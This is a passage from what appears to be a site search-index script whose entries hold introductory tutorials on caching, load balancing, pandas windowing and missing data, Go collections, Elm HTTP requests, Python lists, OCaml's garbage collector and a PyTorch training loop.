dedicated caching layer allows systems and applications to operate independently from the cache, with their own lifecycles, without risking cache integrity. This central cache layer can be accessed by disparate systems, providing a consistent data source even when application nodes scale dynamically.\nCaching Best Practices link Data Validity: Ensure the validity of the data being cached to achieve a high cache hit rate. TTL (Time to Live): Implement TTL controls to expire data accordingly. High Availability: Use highly available in-memory engines like Redis to ensure continuous data availability. RTO and RPO: Define appropriate Recovery Time Objective (RTO) and Recovery Point Objective (RPO) for data stored in the cache. Benefits of Caching linkImprove Application Performance linkMemory access is much faster than disk access. Reading data from an in-memory cache is sub-millisecond, significantly improving application performance.\nReduce Database Cost linkA single cache instance can handle hundreds of thousands of IOPS, potentially reducing the need for multiple database instances and lowering overall costs.\nReduce Backend Load linkCaching reduces the load on backend databases by redirecting read requests to the in-memory layer, preventing performance degradation or crashes during traffic spikes.\nPredictable Performance linkBy handling traffic spikes efficiently, caching ensures consistent application performance even during high-demand periods like Black Friday or major events.\nEliminate Database Hotspots linkCaching frequently accessed data prevents database hotspots and avoids overprovisioning of database resources, maintaining fast and predictable performance.\nIncrease Read Throughput linkIn-memory systems offer much higher request rates compared to disk-based databases, supporting hundreds of thousands of requests per second.\nUse Cases \u0026 Industries linkDatabase Caching linkDatabase caching dramatically increases throughput and lowers data retrieval latency, improving overall application performance. Techniques like lazy loading and write-through methods are commonly used.\nContent Delivery Networks (CDN) linkCDNs utilize a global network of edge locations to deliver cached web content, reducing response times and increasing throughput. CDNs like Amazon CloudFront integrate with other services to accelerate content delivery.\nDNS Caching linkDNS caching stores domain request data closer to the client, improving query resolution times and reducing load on upstream servers.\nSession Management linkCentralized session management data stores ensure consistent user experiences across web servers, better session durability, and higher availability.\nApplication Programming Interfaces (APIs) linkCaching API responses can optimize performance by reducing backend load and improving response times, especially for APIs serving static or infrequently changing data.\nCaching for Hybrid Environments linkCaching on-premises data in the cloud can optimize data retrieval performance in hybrid cloud environments, reducing latency and improving efficiency.\nWeb Caching linkWeb caching reduces latency and server load by caching web artifacts. Server-side caching typically involves web proxies, while client-side caching can include browser-based caching.\nGeneral Cache linkUsing an in-memory key-value store as a standalone database can build highly performant applications, benefiting from high throughput and cost-effectiveness.\nIntegrated Cache linkIntegrated caches automatically cache frequently accessed data from the origin database, enhancing performance by reducing latency and resource utilization.\nBy implementing effective caching strategies, you can significantly enhance application performance, reduce costs, and ensure reliable and scalable systems.\n"
            }
        );
    index.add(
            {
                id:  265 ,
                href: "\/tutorials\/docs\/system-design\/system-design\/load_balancing\/",
                title: "What is Load Balancing?",
                description: "If you are looking to grow in you tech career and understand system design indepth, this guide is for you.",
                content: "Load balancing is a method used to distribute network traffic across multiple servers, ensuring that no single server bears too much demand. This technique is crucial for modern applications that must handle millions of users simultaneously, delivering text, videos, images, and other data reliably and swiftly. Load balancers act as intermediaries, distributing incoming traffic evenly among servers to optimize resource use and enhance performance.\nBenefits of Load Balancing linkLoad balancing offers several key benefits, improving application availability, scalability, security, and performance.\nApplication Availability linkLoad balancers enhance fault tolerance by detecting server issues and redirecting traffic to available servers, thus minimizing downtime. This functionality allows for:\nMaintenance and Upgrades: Perform server maintenance or upgrades without affecting application availability. Automatic Disaster Recovery: Redirect traffic to backup servers in case of primary server failure. Health Checks: Continuously monitor server health to prevent downtime. Application Scalability linkBy distributing network traffic intelligently, load balancers prevent traffic bottlenecks and facilitate scaling. They allow applications to handle thousands of requests by:\nPreventing Bottlenecks: Evenly distributing traffic to avoid overloading any single server. Predicting Traffic: Adjusting the number of servers based on traffic predictions. Adding Redundancy: Ensuring additional servers can be brought online to meet demand. Application Security linkLoad balancers provide an extra layer of security by mitigating distributed denial of service (DDoS) attacks and monitoring traffic for malicious activity. They can:\nMonitor and Block Traffic: Detect and block malicious content. Distribute Attack Traffic: Minimize the impact of attacks by spreading traffic across multiple servers. Route Through Firewalls: Enhance security by routing traffic through network firewalls. Application Performance linkLoad balancers improve performance by reducing response time and network latency. They achieve this by:\nEven Load Distribution: Balancing the load across servers to maintain optimal performance. Geographical Routing: Directing requests to the nearest server to reduce latency. Ensuring Reliability: Maintaining consistent performance of physical and virtual computing resources. Load Balancing Algorithms linkLoad balancing algorithms are rules that determine how traffic is distributed among servers. They can be classified into two main categories: static and dynamic.\nStatic Load Balancing linkStatic algorithms distribute traffic based on predefined rules, regardless of the current server state.\nRound-Robin Method linkThe round-robin method assigns incoming requests to each server in turn. This simple method ensures an even distribution of traffic over time.\nWeighted Round-Robin Method linkIn this method, servers are assigned weights based on their capacity or priority. Servers with higher weights receive more traffic.\nIP Hash Method linkThe load balancer uses a hash function on the client IP address to determine which server should handle the request, ensuring consistent routing for the same client.\nDynamic Load Balancing linkDynamic algorithms consider the current state of each server before distributing traffic.\nLeast Connection Method linkTraffic is directed to the server with the fewest active connections, assuming all connections require equal processing power.\nWeighted Least Connection Method linkServers are assigned weights based on their capacity, and new connections are directed to the server with the least load relative to its capacity.\nLeast Response Time Method linkCombining server response time and active connections, this method directs traffic to the server that can respond the fastest.\nResource-Based Method linkLoad balancers check the current load on each server, including CPU and memory usage, before distributing traffic.\nHow Load Balancing Works linkLoad balancing involves distributing client requests to a pool of servers, known as a server farm. The load balancer routes each request to the most suitable server, optimizing resource use and performance. This process is akin to a restaurant manager assigning customers to waiters, ensuring balanced workloads.\nTypes of Load Balancing linkApplication Load Balancing linkApplication load balancers distribute traffic based on the content of the request, such as HTTP headers or SSL session IDs. This is useful for applications with multiple functions, like an e-commerce site with distinct product browsing and checkout processes.\nNetwork Load Balancing linkNetwork load balancers use IP addresses and other network information to direct traffic. They can assign static IP addresses to multiple servers and use both static and dynamic algorithms for load distribution.\nGlobal Server Load Balancing linkThis type involves managing traffic across geographically distributed servers, ensuring clients are directed to the nearest or most optimal server. This enhances performance and reliability, especially in global applications.\nDNS Load Balancing linkDNS load balancing routes network requests across a pool of resources associated with a domain. It helps maintain application availability and distribute traffic globally.\nTypes of Load Balancing Technology linkHardware Load Balancers linkHardware load balancers are physical devices that can process and redirect significant amounts of traffic securely. They are often used in data centers and can be managed centrally through virtualization.\nSoftware Load Balancers linkSoftware load balancers perform the same functions as hardware load balancers but are applications that can be installed on servers or accessed as a managed service. They are more flexible, scalable, and cost-effective, especially in cloud environments.\nComparison of Hardware and Software Load Balancers linkHardware load balancers require significant upfront investment and ongoing maintenance. They may not always be used to full capacity, especially during peak traffic times. In contrast, software load balancers are more flexible, easier to scale, and generally more compatible with cloud computing environments, offering lower setup and operational costs.\nConclusion linkLoad balancing is essential for modern applications, ensuring optimal performance, availability, scalability, and security. By distributing network traffic across multiple servers, load balancers help applications handle high volumes of user requests efficiently and reliably. Understanding the different types of load balancing and their respective algorithms allows businesses to choose the best solution for their needs, ensuring a seamless and robust user experience.\n"
            }
        );
    index.add(
            {
                id:  266 ,
                href: "\/tutorials\/docs\/pandas\/pandas\/windowing_operations\/",
                title: "Windowing Operations in Pandas",
                description: "In this section, you will be learning more about Dataframes, how to load data into one and how to perform operations.",
                content: "Windowing operations in Pandas are essential for performing calculations over a sliding window of data. These operations are particularly useful for time series data analysis, where you might want to compute rolling averages, cumulative sums, or other statistics over a specified window. Pandas provides several methods for windowing operations, including rolling, expanding, and ewm (exponentially weighted windows).\nRolling Window linkThe rolling method in Pandas allows you to perform operations over a fixed-size sliding window.\nBasic Rolling Window link import pandas as pd import numpy as np # Creating a DataFrame with a datetime index dates = pd.date_range('20230101', periods=6) df = pd.DataFrame({'A': [1, 2, 3, 4, 5, 6]}, index=dates) # Applying a rolling window of size 3 and calculating the mean rolling_mean = df['A'].rolling(window=3).mean() print(rolling_mean) Output:\n2023-01-01 NaN 2023-01-02 NaN 2023-01-03 2.0 2023-01-04 3.0 2023-01-05 4.0 2023-01-06 5.0 Freq: D, Name: A, dtype: float64 Rolling Window with Different Functions linkYou can use various functions with the rolling method, such as sum, std, min, max, etc.\n# Rolling sum rolling_sum = df['A'].rolling(window=3).sum() print(rolling_sum) # Rolling standard deviation rolling_std = df['A'].rolling(window=3).std() print(rolling_std) Output:\n2023-01-01 NaN 2023-01-02 NaN 2023-01-03 6.0 2023-01-04 9.0 2023-01-05 12.0 2023-01-06 15.0 Freq: D, Name: A, dtype: float64 2023-01-01 NaN 2023-01-02 NaN 2023-01-03 1.000000 2023-01-04 1.000000 2023-01-05 1.000000 2023-01-06 1.000000 Freq: D, Name: A, dtype: float64 Centering the Rolling Window linkYou can center the rolling window by setting the center parameter to True.\n# Centered rolling mean rolling_mean_centered = df['A'].rolling(window=3, center=True).mean() print(rolling_mean_centered) Output:\n2023-01-01 NaN 2023-01-02 2.0 2023-01-03 3.0 2023-01-04 4.0 2023-01-05 5.0 2023-01-06 NaN Freq: D, Name: A, dtype: float64 Expanding Window linkThe expanding method calculates statistics over an expanding window, which starts from the beginning of the data and includes all prior data points.\nBasic Expanding Window link # Expanding mean expanding_mean = df['A'].expanding().mean() print(expanding_mean) Output:\n2023-01-01 1.0 2023-01-02 1.5 2023-01-03 2.0 2023-01-04 2.5 2023-01-05 3.0 2023-01-06 3.5 Freq: D, Name: A, dtype: float64 Expanding Window with Different Functions linkYou can use various functions with the expanding method, such as sum, std, min, max, etc.\n# Expanding sum expanding_sum = df['A'].expanding().sum() print(expanding_sum) # Expanding standard deviation expanding_std = df['A'].expanding().std() print(expanding_std) Output:\n2023-01-01 1 2023-01-02 3 2023-01-03 6 2023-01-04 10 2023-01-05 15 2023-01-06 21 Freq: D, Name: A, dtype: int64 2023-01-01 NaN 2023-01-02 0.707107 2023-01-03 1.000000 2023-01-04 1.290994 2023-01-05 1.581139 2023-01-06 1.870829 Freq: D, Name: A, dtype: float64 Exponentially Weighted Window linkThe ewm method calculates statistics using exponentially weighted functions, which give more weight to recent data points.\nBasic Exponentially Weighted Window link # Exponentially weighted mean ewm_mean = df['A'].ewm(span=3).mean() print(ewm_mean) Output:\n2023-01-01 1.000000 2023-01-02 1.666667 2023-01-03 2.428571 2023-01-04 3.266667 2023-01-05 4.153846 2023-01-06 5.081081 Freq: D, Name: A, dtype: float64 Exponentially Weighted Window with Different Functions linkYou can use various functions with the ewm method, such as sum, std, etc.\n# Exponentially weighted standard deviation ewm_std = df['A'].ewm(span=3).std() print(ewm_std) Output:\n2023-01-01 NaN 2023-01-02 0.707107 2023-01-03 0.955813 2023-01-04 1.130388 2023-01-05 1.250972 2023-01-06 1.333333 Freq: D, Name: A, dtype: float64 Combining Windowing Operations linkYou can combine rolling, expanding, and exponentially weighted windows with other Pandas operations for more complex calculations.\n# Combining rolling mean and expanding sum combined = df['A'].rolling(window=2).mean().expanding().sum() print(combined) Output:\n2023-01-01 NaN 2023-01-02 1.5 2023-01-03 3.5 2023-01-04 6.5 2023-01-05 10.5 2023-01-06 15.5 Freq: D, Name: A, dtype: float64 Conclusion linkWindowing operations in Pandas provide powerful tools for calculating statistics over a sliding or expanding window of data. Whether you need rolling windows, expanding windows, or exponentially weighted windows, Pandas offers flexible and efficient methods to perform these operations. By mastering these techniques, you can enhance your data analysis capabilities and gain deeper insights from your data.\n"
            }
        );
    index.add(
            {
                id:  267 ,
                href: "\/tutorials\/docs\/golang\/golang\/working-with-collections-in-go\/",
                title: "Working with Collections in Go",
                description: "Learn how to efficiently manage collections in Go, including mastering arrays, slices, maps, and iterating over these collections using the range clause.",
                content: "Introduction:\nWelcome, Go enthusiasts! When you’re developing in Go, you’ll often find yourself managing groups of data. Go provides several efficient ways to handle such collections, including arrays, slices, maps, and the powerful range clause for iteration. In this detailed blog, we’ll dissect each of these types, providing you with the knowledge to use these structures effectively in your Go programs.\n1. Arrays and Slices\na. Arrays:\nAn array in Go is a numbered sequence of elements of a specific length and type. The size of an array is fixed, and its definition syntax is as follows:\nvar myArray [5]int Here, myArray is an array that can hold 5 integers. Arrays are zero-indexed, and you can set or access elements using their indices:\nmyArray[0] = 100 fmt.Println(myArray[0]) // Outputs: 100 Arrays in Go are values, meaning when you assign or pass them to functions, the entire array is copied.\nb. Slices:\nSlices are more flexible and dynamic alternatives to arrays. They are built on top of arrays but can resize dynamically, which makes them more versatile:\nmySlice := []int{10, 20, 30, 40, 50} You can create a slice from an array:\nanotherSlice := myArray[1:4] // Slice from index 1 to 3, index 4 not included Slices are reference types, meaning when you pass a slice to a function, you’re passing a reference to its underlying array, not a full copy.\n2. Maps\nMaps are Go’s built-in associative data type, similar to hashes or dictionaries in other languages. They are collections of key-value pairs, where each key is unique:\nmyMap := make(map[string]int) myMap[\"key1\"] = 100 myMap[\"key2\"] = 200 fmt.Println(myMap[\"key1\"]) // Outputs: 100 You can check if a key exists in a map and handle it accordingly:\nvalue, exists := myMap[\"key3\"] if exists { fmt.Println(value) } else { fmt.Println(\"Key does not exist.\") } 3. Iterating Over Collections with Range\nThe range clause is a powerful feature in Go that allows you to iterate over elements in a variety of data structures. This can be used with arrays, slices, strings, maps, and channels. Here’s how you use it:\na. Arrays and Slices:\nfor index, value := range mySlice { fmt.Printf(\"Index: %d, Value: %d\\n\", index, value) } b. Maps:\nfor key, value := range myMap { fmt.Printf(\"Key: %s, Value: %d\\n\", key, value) } c. Strings:\nWhen used with strings, range iterates over Unicode code points, not bytes:\nfor index, runeValue := range \"Go Lang\" { fmt.Printf(\"%d -\u003e %U\\n\", index, runeValue) } Conclusion:\nUnderstanding how to work with collections in Go is crucial for effective programming, especially when dealing with large datasets or systems where performance and memory efficiency are critical. Arrays and slices provide you with options for ordered collections, while maps offer a powerful mechanism for associating keys with values. The range clause further enhances your ability to manage and manipulate these collections with ease and elegance.\nNow, if you are interested in upskilling in 2024 with AI development, check out this 6 AI advanced projects with Go where you learng about building with AI and getting the best knowledge there is currently. Here’s the link\nFrequently Asked Questions:\nQ: How do I delete an element from a map? A: Use the delete function: delete(myMap, \"key1\").\nQ: Can I resize an array? A: No, arrays in Go are of fixed size. However, you can create a new slice with the desired size based on the array.\nQ: What happens if I try to access an element using a key that doesn’t exist in a map? A: You get the zero value of the map’s value type.\nEmbrace these collection techniques and continue exploring more advanced features as you refine your Go programming skills. Happy coding!\n"
            }
        );
    index.add(
            {
                id:  268 ,
                href: "\/tutorials\/docs\/elm\/elm\/working_with_http_requests\/",
                title: "Working with HTTP Requests",
                description: "Handling HTTP requests and JSON data in Elm.",
                content: "Working with HTTP Requests linkElm provides a smooth way to handle HTTP requests with the Http module.\nMaking a GET Request linkHere’s an example of how to make a GET request to fetch data:\nfetchDataCmd : Cmd Msg fetchDataCmd = Http.get { url = \"https://api.example.com/data\" , expect = Http.expectString ReceiveData } This function creates a command that, when executed, sends a GET request to the specified URL and expects a string response.\nHandling the Response linkTo handle the response from the GET request, you need to define a message and update function that processes the response:\ntype Msg = ReceiveData (Result Http.Error String) update : Msg -\u003e Model -\u003e (Model, Cmd Msg) update msg model = case msg of ReceiveData (Ok data) -\u003e ({ model | data = data }, Cmd.none) ReceiveData (Err error) -\u003e ({ model | error = Just error }, Cmd.none) JSON Decoding linkElm handles JSON data using decoders. A JSON decoder describes how to convert JSON data into Elm values.\nDecoding JSON linkHere’s an example of a JSON decoder:\ntype alias User = { id : Int , name : String } userDecoder : Decoder User userDecoder = Decode.map2 User (Decode.field \"id\" Decode.int) (Decode.field \"name\" Decode.string) This userDecoder can be used to decode a JSON object into a User record.\nUsing JSON Decoder in HTTP Request linkYou can use this decoder with the Http module to decode the response of an HTTP request:\nfetchUserCmd : Cmd Msg fetchUserCmd = Http.get { url = \"https://api.example.com/user\" , expect = Http.expectJson ReceiveUser userDecoder } In this example, when the data is received from the URL, it’s decoded using userDecoder.\nHandling JSON Response linkTo handle the JSON response, you need to define a message and update function that processes the decoded data:\ntype Msg = ReceiveUser (Result Http.Error User) update : Msg -\u003e Model -\u003e (Model, Cmd Msg) update msg model = case msg of ReceiveUser (Ok user) -\u003e ({ model | user = Just user }, Cmd.none) ReceiveUser (Err error) -\u003e ({ model | error = Just error }, Cmd.none) Complete Example linkCombining all the pieces, here’s a complete example of fetching and decoding JSON data in Elm:\nmodule Main exposing (..) import Browser import Html exposing (Html, div, text, button) import Html.Events exposing (onClick) import Http import Json.Decode exposing (Decoder, field, int, string, map2) -- MODEL type alias Model = { user : Maybe User , error : Maybe Http.Error } initModel : Model initModel = { user = Nothing , error = Nothing } type alias User = { id : Int , name : String } -- UPDATE type Msg = FetchUser | ReceiveUser (Result Http.Error User) update : Msg -\u003e Model -\u003e (Model, Cmd Msg) update msg model = case msg of FetchUser -\u003e (model, fetchUserCmd) ReceiveUser (Ok user) -\u003e ({ model | user = Just user, error = Nothing }, Cmd.none) ReceiveUser (Err error) -\u003e ({ model | error = Just error, user = Nothing }, Cmd.none) fetchUserCmd : Cmd Msg fetchUserCmd = Http.get { url = \"https://api.example.com/user\" , expect = Http.expectJson ReceiveUser userDecoder } userDecoder : Decoder User userDecoder = map2 User (field \"id\" int) (field \"name\" string) -- VIEW view : Model -\u003e Html Msg view model = div [] [ case model.user of Just user -\u003e div [] [ text (\"User: \" ++ user.name ++ \", ID: \" ++ String.fromInt user.id) ] Nothing -\u003e text \"No user data\" , case model.error of Just error -\u003e div [] [ text (\"Error: \" ++ Http.errorToString error) ] Nothing -\u003e text \"\" , button [ onClick FetchUser ] [ text \"Fetch User\" ] ] -- MAIN main = Browser.sandbox { init = initModel, update = update, view = view } In this complete example, clicking the “Fetch User” button triggers an HTTP GET request to fetch user data, decodes the JSON response, and updates the view accordingly.\n"
            }
        );
    index.add(
            {
                id:  269 ,
                href: "\/tutorials\/docs\/python\/python\/python_lists_and_tuples\/",
                title: "Working with Lists and Tuples in Python: Creation, Access, and More",
                description: "Discover how to effectively use lists and tuples in Python. Learn to create and access these data structures, utilize list comprehensions for concise coding, and understand tuple operations with clear examples.",
                content: "Introduction linkLists and tuples are fundamental Python data structures for storing collections of data. Lists are mutable, allowing modification after creation. Tuples, however, are immutable, meaning they cannot be changed once created. This section explores how to work with these structures.\nCreating and Accessing Lists linkLists are versatile and can be used to store a collection of items (strings, numbers, or other lists).\nCreating Lists linkYou can create a list by enclosing items in square brackets [], separated by commas.\nExample: link fruits = ['apple', 'banana', 'cherry'] print(fruits) Accessing List Items linkList items are indexed and can be accessed by referring to the index number, starting from zero.\nExample: link first_fruit = fruits[0] # Accessing the first item print(\"The first fruit is:\", first_fruit) List Comprehensions linkList comprehensions provide a concise way to create lists based on existing lists.\nSyntax and Explanation: link new_list = [expression for item in iterable if condition] Example: link # Create a list of squares from 1 to 10 squares = [x**2 for x in range(1, 11)] print(squares) This example creates a list of square numbers from 1 to 10. It’s a clear and efficient way to generate a list without needing multiple lines of code for a loop.\nOperations on Tuples linkTuples are similar to lists but are immutable. They are created by placing comma-separated values inside parentheses ().\nCreating Tuples link my_tuple = (1, 2, 3) print(my_tuple) Accessing Tuple Items linkTuple items are accessed similarly to list items, by using index numbers.\nExample: link print(\"First element of the tuple:\", my_tuple[0]) Tuple Operations linkWhile you cannot modify tuples, you can perform operations such as concatenation and repetition.\nExample: link # Concatenating two tuples tuple1 = (1, 2, 3) tuple2 = (4, 5, 6) combined_tuple = tuple1 + tuple2 print(combined_tuple) # Repeating a tuple repeated_tuple = tuple1 * 2 print(repeated_tuple) Conclusion linkLists and tuples are integral to data handling in Python. Lists offer flexibility and a wide array of methods for manipulation, making them suitable for applications where the collection of items might change. Tuples, being immutable, are perfect for fixed data sets and can serve as keys in dictionaries. This guide has explored how to create, access, and manipulate these structures with practical examples.\n"
            }
        );
    index.add(
            {
                id:  270 ,
                href: "\/tutorials\/docs\/pandas\/pandas\/working_with_missing_data\/",
                title: "Working with Missing Data in Pandas",
                description: "In this section, you will be learning more about Dataframes, how to load data into one and how to perform operations.",
                content: "Handling missing data is a crucial part of data cleaning and preprocessing. Missing values can cause errors in analysis and skew results. Pandas provides several methods to detect, handle, and clean missing data efficiently.\nDetecting Missing Data linkPandas uses the NaN (Not a Number) value to represent missing data. You can detect missing data using the following methods:\nChecking for Missing Data linkUse isna() or isnull() to detect missing values in a DataFrame or Series.\nimport pandas as pd import numpy as np # Creating a DataFrame with missing values df = pd.DataFrame({ 'A': [1, 2, np.nan, 4], 'B': [np.nan, 2, 3, 4], 'C': [1, 2, 3, np.nan] }) print(df.isna()) print(df.isnull()) Output:\nA B C 0 False True False 1 False False False 2 True False False 3 False False True Counting Missing Data linkUse sum() to count the number of missing values.\nprint(df.isna().sum()) Output:\nA 1 B 1 C 1 dtype: int64 Handling Missing Data linkThere are several strategies to handle missing data, such as dropping, filling, and interpolating missing values.\nDropping Missing Data linkUse dropna() to remove missing values.\n# Dropping rows with any missing values print(df.dropna()) # Dropping columns with any missing values print(df.dropna(axis=1)) # Dropping rows where all elements are missing print(df.dropna(how='all')) # Dropping rows where fewer than a specified number of non-NA values are present print(df.dropna(thresh=2)) Output:\nA B C 1 2.0 2.0 2.0 C 0 1.0 1 2.0 2 3.0 A B C 0 1.0 NaN 1.0 1 2.0 2.0 2.0 2 NaN 3.0 3.0 3 4.0 4.0 NaN A B C 0 1.0 NaN 1.0 1 2.0 2.0 2.0 2 NaN 3.0 3.0 3 4.0 4.0 NaN Filling Missing Data linkUse fillna() to fill missing values with a specified value or method.\n# Filling missing values with a constant print(df.fillna(0)) # Forward fill: filling with the previous value print(df.fillna(method='ffill')) # Backward fill: filling with the next value print(df.fillna(method='bfill')) # Filling missing values with the mean of the column print(df.fillna(df.mean())) Output:\nA B C 0 1.0 0.0 1.0 1 2.0 2.0 2.0 2 0.0 3.0 3.0 3 4.0 4.0 0.0 A B C 0 1.0 NaN 1.0 1 2.0 2.0 2.0 2 2.0 3.0 3.0 3 4.0 4.0 3.0 A B C 0 1.0 2.0 1.0 1 2.0 2.0 2.0 2 4.0 3.0 3.0 3 4.0 4.0 NaN A B C 0 1.0 3.000000 1.000000 1 2.0 2.000000 2.000000 2 2.333333 3.000000 3.000000 3 4.0 4.000000 2.0 Interpolating Missing Data linkUse interpolate() to fill missing values using interpolation.\nprint(df.interpolate()) Output:\nA B C 0 1.0 NaN 1.0 1 2.0 2.0 2.0 2 3.0 3.0 3.0 3 4.0 4.0 NaN Advanced Missing Data Handling linkUsing where to Conditionally Replace linkThe where() method can be used to replace values conditionally.\nprint(df.where(pd.notna(df), df.mean(), axis=1)) Output:\nA B C 0 1.0 3.000000 1.0 1 2.0 2.000000 2.0 2 3.0 3.000000 3.0 3 4.0 4.000000 2.0 Replacing Specific Values linkUse replace() to replace specific values with other values.\nprint(df.replace(np.nan, -1)) Output:\nA B C 0 1.0 -1.0 1.0 1 2.0 2.0 2.0 2 -1.0 3.0 3.0 3 4.0 4.0 -1.0 Summary of Missing Data Handling Methods link isna(), isnull(): Detect missing values. notna(), notnull(): Detect non-missing values. dropna(): Drop missing values. fillna(): Fill missing values. interpolate(): Interpolate missing values. replace(): Replace specific values. where(): Replace values conditionally. Conclusion linkHandling missing data is an essential step in the data cleaning process. Pandas provides robust methods to detect, handle, and clean missing values, ensuring your dataset is ready for analysis. By effectively managing missing data, you can maintain the integrity of your analyses and draw more accurate conclusions.\n"
            }
        );
    index.add(
            {
                id:  271 ,
                href: "\/tutorials\/docs\/ocaml\/ocaml\/garbage_collector_using_ocaml\/",
                title: "Working with the Garbage Collector in OCaml",
                description: "Learn how to handle command line arguments in ocaml",
                content: "Introduction linkIn this tutorial, we will explore how to use OCaml’s Gc module to interact with the garbage collector and how to write your own finalizers. We will also provide exercises to help you develop a better understanding.\nThe Gc Module linkThe Gc module contains useful functions for querying and controlling the garbage collector from OCaml programs.\nExample: Running GC and Printing Statistics linkThe following program runs and then prints out GC statistics before quitting:\nlet rec iterate r x_init i = if i = 1 then x_init else let x = iterate r x_init (i - 1) in r *. x *. (1.0 -. x) let () = Random.self_init (); Graphics.open_graph \" 640x480\"; for x = 0 to 640 do let r = 4.0 *. float_of_int x /. 640.0 in for i = 0 to 39 do let x_init = Random.float 1.0 in let x_final = iterate r x_init 500 in let y = int_of_float (x_final *. 480.) in Graphics.plot x y done done; Gc.print_stat stdout When you run this program, it prints out GC statistics such as minor_words, major_words, minor_collections, and major_collections.\nEnabling GC Debugging Messages linkTo print debugging messages when certain events occur (e.g., on every major collection), add the following code at the beginning of the program:\nGc.set { (Gc.get ()) with Gc.verbose = 0x01 } This will cause the GC to print a message at the start of every major collection.\nFinalization and the Weak Module linkYou can write a finalizer function that gets called when an object is about to be freed by the GC.\nThe Weak module lets you create weak pointers, which hint to the garbage collector that the object may be collected at any time.\nExample: In-Memory Object Database Cache linkLet’s create an in-memory object database cache that uses finalizers and weak pointers.\nData Structure linkDefine the in-memory and on-disk formats:\n(* In-memory format. *) type record = { mutable name : string; mutable address : string } (* On-disk format. *) let record_size = 256 let name_size = 64 let addr_size = 192 Low-Level Functions linkDefine functions to read, write, lock, and unlock records:\nlet seek_record n fd = ignore (Unix.lseek fd (n * record_size) Unix.SEEK_SET) let write_record record n fd = seek_record n fd; ignore (Unix.write fd (Bytes.of_string record.name) 0 name_size); ignore (Unix.write fd (Bytes.of_string record.address) 0 addr_size) let read_record record n fd = seek_record n fd; ignore (Unix.read fd (Bytes.of_string record.name) 0 name_size); ignore (Unix.read fd (Bytes.of_string record.address) 0 addr_size) let lock_record n fd = seek_record n fd; Unix.lockf fd Unix.F_LOCK record_size let unlock_record n fd = seek_record n fd; Unix.lockf fd Unix.F_ULOCK record_size Creating New Records linkDefine a function to create new, empty in-memory record objects:\nlet new_record () = { name = String.make name_size ' '; address = String.make addr_size ' ' } Fixed Number of Records linkSet the total number of records:\nlet nr_records = 10000 let diskfile = Unix.openfile \"users.bin\" [ Unix.O_RDWR; Unix.O_CREAT ] 0o666 Record Cache linkDefine the cache of records:\nlet cache = Weak.create nr_records Finalizer Function linkDefine the finalizer function:\nlet finaliser n record = Printf.printf \"*** objcache: finalising record %d\\n%!\" n; write_record record n diskfile; unlock_record n diskfile Get Record Function linkDefine the function to get a record from the cache or disk:\nlet get_record n = match Weak.get cache n with | Some record -\u003e Printf.printf \"*** objcache: fetching record %d from memory cache\\n%!\" n; record | None -\u003e Printf.printf \"*** objcache: loading record %d from disk\\n%!\" n; let record = new_record () in Gc.finalise (finaliser n) record; lock_record n diskfile; read_record record n diskfile; Weak.set cache n (Some record); record Sync Records Function linkDefine the function to synchronize records:\nlet sync_records () = for i = 0 to nr_records - 1 do Weak.set cache i None done; Gc.full_major () Test Code linkDownload the complete program and test code objcache.ml, and compile it with:\n$ ocamlc unix.cma objcache.ml -o objcache Conclusion linkIn this tutorial, we learned how to use the Gc module to interact with the garbage collector and how to write finalizers using the Weak module. We also implemented an in-memory object database cache as a practical example. By understanding and utilizing these concepts, you can manage memory more effectively in OCaml programs.\n"
            }
        );
    index.add(
            {
                id:  272 ,
                href: "\/tutorials\/docs\/pytorch\/pytorch\/writing_a_training_loop_from_scratch_in_pytorch\/",
                title: "Writing a training loop from scratch in PyTorch",
                description: "A comprehensive introduction to PyTorch for deep learning.",
                content: "Introduction linkKeras provides default training and evaluation loops, fit() and evaluate().\nIf you want to customize the learning algorithm of your model while still leveraging the convenience of fit() (for instance, to train a GAN using fit()), you can subclass the Model class and implement your own train_step() method, which is called repeatedly during fit().\nNow, if you want very low-level control over training \u0026 evaluation, you should write your own training \u0026 evaluation loops from scratch. This is what this guide is about.\nExample linkTo write a custom training loop, we need the following ingredients:\nA model to train, of course. An optimizer. You could either use a keras.optimizers optimizer, or a native PyTorch optimizer from torch.optim. A loss function. You could either use a keras.losses loss, or a native PyTorch loss from torch.nn. A dataset. You could use any format: a tf.data.Dataset, a PyTorch DataLoader, a Python generator, etc. Let’s line them up. We’ll use torch-native objects in each case – except, of course, for the Keras model. First, let’s get the model and the MNIST dataset:\n# Let's consider a simple MNIST model def get_model(): inputs = keras.Input(shape=(784,), name=\"digits\") x1 = keras.layers.Dense(64, activation=\"relu\")(inputs) x2 = keras.layers.Dense(64, activation=\"relu\")(x1) outputs = keras.layers.Dense(10, name=\"predictions\")(x2) model = keras.Model(inputs=inputs, outputs=outputs) return model # Create load up the MNIST dataset and put it in a torch DataLoader # Prepare the training dataset. batch_size = 32 (x_train, y_train), (x_test, y_test) = keras.datasets.mnist.load_data() x_train = np.reshape(x_train, (-1, 784)).astype(\"float32\") x_test = np.reshape(x_test, (-1, 784)).astype(\"float32\") y_train = keras.utils.to_categorical(y_train) y_test = keras.utils.to_categorical(y_test) # Reserve 10,000 samples for validation. x_val = x_train[-10000:] y_val = y_train[-10000:] x_train = x_train[:-10000] y_train = y_train[:-10000] # Create torch Datasets train_dataset = torch.utils.data.TensorDataset( torch.from_numpy(x_train), torch.from_numpy(y_train) ) val_dataset = torch.utils.data.TensorDataset( torch.from_numpy(x_val), torch.from_numpy(y_val) ) # Create DataLoaders for the Datasets train_dataloader = torch.utils.data.DataLoader( train_dataset, batch_size=batch_size, shuffle=True ) val_dataloader = torch.utils.data.DataLoader( val_dataset, batch_size=batch_size, shuffle=False ) Next, here’s our PyTorch optimizer and our PyTorch loss function:\n# Instantiate a torch optimizer model = get_model() optimizer = torch.optim.Adam(model.parameters(), lr=1e-3) # Instantiate a torch loss function loss_fn = torch.nn.CrossEntropyLoss() Let’s train our model using mini-batch gradient with a custom training loop.\nCalling loss.backward() on a loss tensor triggers backpropagation. Once that’s done, your optimizer is magically aware of the gradients for each variable and can update its variables, which is done via optimizer.step(). Tensors, variables, optimizers are all interconnected to one another via hidden global state. Also, don’t forget to call model.zero_grad() before loss.backward(), or you won’t get the right gradients for your variables.\nHere’s our training loop, step by step:\nWe open a for loop that iterates over epochs For each epoch, we open a for loop that iterates over the dataset, in batches For each batch, we call the model on the input data to retrieve the predictions, then we use them to compute a loss value We call loss.backward() to Outside the scope, we retrieve the gradients of the weights of the model with regard to the loss Finally, we use the optimizer to update the weights of the model based on the gradients epochs = 3 for epoch in range(epochs): for step, (inputs, targets) in enumerate(train_dataloader): # Forward pass logits = 